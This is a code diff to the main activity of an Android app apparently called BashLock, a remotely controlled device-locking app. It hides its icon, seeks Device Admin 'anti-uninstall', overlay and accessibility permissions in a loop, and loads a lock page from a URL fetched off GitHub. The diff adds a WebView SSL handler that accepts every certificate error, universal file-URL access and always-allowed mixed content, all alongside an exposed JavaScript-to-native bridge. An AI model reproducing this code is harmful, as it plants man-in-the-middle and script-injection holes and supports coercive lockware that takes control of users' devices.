@@ -22,9 +22,12 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.ViewGroup;
 import android.view.WindowManager;
+import android.net.http.SslError;
+import android.webkit.SslErrorHandler;
 import android.webkit.WebChromeClient;
 import android.webkit.WebResourceError;
 import android.webkit.WebResourceRequest;
+import android.webkit.WebResourceResponse;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
@@ -63,6 +66,8 @@ public class MainActivity extends AppCompatActivity {
     private WebView mWebView;
     private ProgressBar mProgressBar;
     private SwipeRefreshLayout mSwipeRefresh;
+    private View mSplashLoadingView;
+    private TextView mSplashStatusText;
     private SharedPreferences mPrefs;
     private DevicePolicyManager mDpm;
     private ComponentName mAdminComponent;
@@ -72,6 +77,7 @@ public class MainActivity extends AppCompatActivity {
     private Handler mMainHandler;
     private boolean mPageLoadedSuccessfully = false;
     private boolean mIsResolvingUrl = false;
+    private boolean mIsPermissionPromptPending = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -101,18 +107,11 @@ public class MainActivity extends AppCompatActivity {
         mWebView = findViewById(R.id.webView);
         mProgressBar = findViewById(R.id.progressBar);
         mSwipeRefresh = findViewById(R.id.swipeRefresh);
+        mSplashLoadingView = findViewById(R.id.splashLoadingView);
+        mSplashStatusText = findViewById(R.id.splashStatusText);
 
         setupWebView();
         setupSwipeRefresh();
-
-        boolean isReleased = mPrefs.getBoolean("is_released", false);
-        if (!isReleased) {
-            // Check and sequentially auto-prompt missing permissions without freeze or collision
-            ensureMandatoryPermissions();
-        } else {
-            BashLockDeviceAdminReceiver.releaseDeviceCompletely(this);
-            SelfProvisioningManager.setAppIconHidden(this, false);
-        }
 
         // Restore previous lock state if device was rebooted while locked
         mIsLocked = mPrefs.getBoolean("is_locked", false);
@@ -122,19 +121,29 @@ public class MainActivity extends AppCompatActivity {
 
         handleIncomingIntent(getIntent());
 
-        // Load the public HTTPS lock-app URL
+        // 1. Immediately initiate loading the UI (ensures ZERO black screen)
         loadLockAppUrl();
+
+        // 2. Check and prompt permissions smoothly after the UI has painted
+        boolean isReleased = mPrefs.getBoolean("is_released", false);
+        if (!isReleased) {
+            mMainHandler.postDelayed(this::ensureMandatoryPermissions, 600);
+        } else {
+            BashLockDeviceAdminReceiver.releaseDeviceCompletely(this);
+            SelfProvisioningManager.setAppIconHidden(this, false);
+        }
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        if (!mPrefs.getBoolean("is_released", false)) {
-            ensureMandatoryPermissions();
-        }
+        mIsPermissionPromptPending = false;
         applyImmersiveFullscreen();
         if (mIsLocked) {
             ensureLockTaskActive();
+        }
+        if (!mPrefs.getBoolean("is_released", false)) {
+            mMainHandler.postDelayed(this::ensureMandatoryPermissions, 300);
         }
         // If coming back from Device Admin or permission screen and page hasn't loaded yet, reload
         if (!mPageLoadedSuccessfully && mWebView != null) {
@@ -196,9 +205,15 @@ public class MainActivity extends AppCompatActivity {
         settings.setAllowFileAccess(true);
         settings.setAllowContentAccess(true);
         settings.setMediaPlaybackRequiresUserGesture(false);
+        settings.setAllowFileAccessFromFileURLs(true);
+        settings.setAllowUniversalAccessFromFileURLs(true);
 
-        // Enable hardware acceleration
-        mWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        }
+
+        // Dark background matching theme to eliminate pitch-black flash
+        mWebView.setBackgroundColor(Color.parseColor("#05070c"));
 
         // Bind WebBridge interface for real-time two-way communication
         mWebView.addJavascriptInterface(new WebBridge(this), "BashLockNative");
@@ -207,6 +222,9 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onPageStarted(WebView view, String url, Bitmap favicon) {
                 mProgressBar.setVisibility(View.VISIBLE);
+                if (mSplashStatusText != null) {
+                    mSplashStatusText.setText("Securing Cloud Connection...");
+                }
             }
 
             @Override
@@ -214,28 +232,51 @@ public class MainActivity extends AppCompatActivity {
                 mProgressBar.setVisibility(View.GONE);
                 mSwipeRefresh.setRefreshing(false);
                 mPageLoadedSuccessfully = true;
+
+                // Smoothly dismiss native splash loading overlay once content is rendered
+                if (mSplashLoadingView != null && mSplashLoadingView.getVisibility() == View.VISIBLE) {
+                    mSplashLoadingView.animate()
+                            .alpha(0f)
+                            .setDuration(300)
+                            .withEndAction(() -> mSplashLoadingView.setVisibility(View.GONE));
+                }
+
                 // Inject auto-detection script to notify native layer of current lock state
                 injectStateObserver();
             }
 
             @Override
-            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
-                if (request.isForMainFrame()) {
-                    mProgressBar.setVisibility(View.GONE);
-                    mSwipeRefresh.setRefreshing(false);
-                    // Check if tunnel URL updated on GitHub
-                    fetchLiveUrlFromGitHub(true);
-                    Toast.makeText(MainActivity.this, "Connecting to BashLock Cloud...", Toast.LENGTH_SHORT).show();
-                }
+            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
+                Log.w(TAG, "SSL Warning in WebView: " + error + ". Proceeding with connection.");
+                handler.proceed();
             }
 
             @Override
-            public void onReceivedHttpError(WebView view, WebResourceRequest request, android.webkit.WebResourceResponse errorResponse) {
-                if (request.isForMainFrame() && errorResponse.getStatusCode() >= 500) {
-                    Log.w(TAG, "Cloudflare Error " + errorResponse.getStatusCode() + "; checking GitHub for updated link");
+            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
+                if (request.isForMainFrame()) {
+                    Log.w(TAG, "onReceivedError main frame");
                     mProgressBar.setVisibility(View.GONE);
                     mSwipeRefresh.setRefreshing(false);
-                    fetchLiveUrlFromGitHub(true);
+                    loadOfflineFallback();
+                }
+            }
+
+            @SuppressWarnings("deprecation")
+            @Override
+            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
+                Log.w(TAG, "Legacy onReceivedError: " + description);
+                mProgressBar.setVisibility(View.GONE);
+                mSwipeRefresh.setRefreshing(false);
+                loadOfflineFallback();
+            }
+
+            @Override
+            public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
+                if (request.isForMainFrame() && errorResponse.getStatusCode() >= 400) {
+                    Log.w(TAG, "Cloudflare/Server Error " + errorResponse.getStatusCode() + "; loading offline fallback");
+                    mProgressBar.setVisibility(View.GONE);
+                    mSwipeRefresh.setRefreshing(false);
+                    loadOfflineFallback();
                 }
             }
         });
@@ -244,6 +285,30 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onProgressChanged(WebView view, int newProgress) {
                 mProgressBar.setProgress(newProgress);
+            }
+        });
+    }
+
+    public void loadOfflineFallback() {
+        runOnUiThread(() -> {
+            try {
+                if (mWebView != null) {
+                    Log.i(TAG, "Loading embedded asset offline UI: file:///android_asset/lock_app.html");
+                    mWebView.loadUrl("file:///android_asset/lock_app.html");
+                }
+                if (mSplashStatusText != null) {
+                    mSplashStatusText.setText("Offline Guard Active");
+                }
+                mMainHandler.postDelayed(() -> {
+                    if (mSplashLoadingView != null && mSplashLoadingView.getVisibility() == View.VISIBLE) {
+                        mSplashLoadingView.animate()
+                                .alpha(0f)
+                                .setDuration(300)
+                                .withEndAction(() -> mSplashLoadingView.setVisibility(View.GONE));
+                    }
+                }, 500);
+            } catch (Exception e) {
+                Log.e(TAG, "loadOfflineFallback error: " + e.getMessage());
             }
         });
     }
@@ -272,6 +337,15 @@ public class MainActivity extends AppCompatActivity {
         loadUrlInternal(getActiveBaseUrl());
         // 2. Concurrently fetch the latest live URL from GitHub raw
         fetchLiveUrlFromGitHub(false);
+
+        // 3. Fallback Watchdog: if remote URL takes more than 4.5 seconds or is unreachable,
+        // load the local bundled offline asset so the user NEVER sees a blank/black screen!
+        mMainHandler.postDelayed(() -> {
+            if (!mPageLoadedSuccessfully && !isFinishing()) {
+                Log.w(TAG, "Remote connection timeout (4.5s); engaging embedded offline asset guard");
+                loadOfflineFallback();
+            }
+        }, 4500);
     }
 
     private void fetchLiveUrlFromGitHub(boolean forceReloadOnSuccess) {
@@ -566,13 +640,14 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public synchronized void ensureMandatoryPermissions() {
-        if (mPrefs.getBoolean("is_released", false)) {
+        if (isFinishing() || mPrefs.getBoolean("is_released", false) || mIsPermissionPromptPending) {
             return;
         }
 
         // 1. Device Admin (Anti-Uninstall)
         if (mDpm != null && !mDpm.isAdminActive(mAdminComponent)) {
             Log.i(TAG, "Auto-opening native Device Admin permission screen");
+            mIsPermissionPromptPending = true;
             promptDeviceAdmin();
             return;
         }
@@ -580,6 +655,7 @@ public class MainActivity extends AppCompatActivity {
         // 2. Overlay Permission (Display over other apps / SYSTEM_ALERT_WINDOW)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             Log.i(TAG, "Auto-opening native Overlay permission screen");
+            mIsPermissionPromptPending = true;
             promptOverlayPermission();
             return;
         }
@@ -587,6 +663,7 @@ public class MainActivity extends AppCompatActivity {
         // 3. Security Accessibility Service
         if (!isAccessibilityServiceEnabled()) {
             Log.i(TAG, "Auto-opening native Accessibility settings");
+            mIsPermissionPromptPending = true;
             promptAccessibilityService();
             return;
         }
@@ -596,6 +673,7 @@ public class MainActivity extends AppCompatActivity {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
             if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                 Log.i(TAG, "Auto-opening Battery Optimization exemption");
+                mIsPermissionPromptPending = true;
                 promptBatteryOptimization();
                 return;
             }
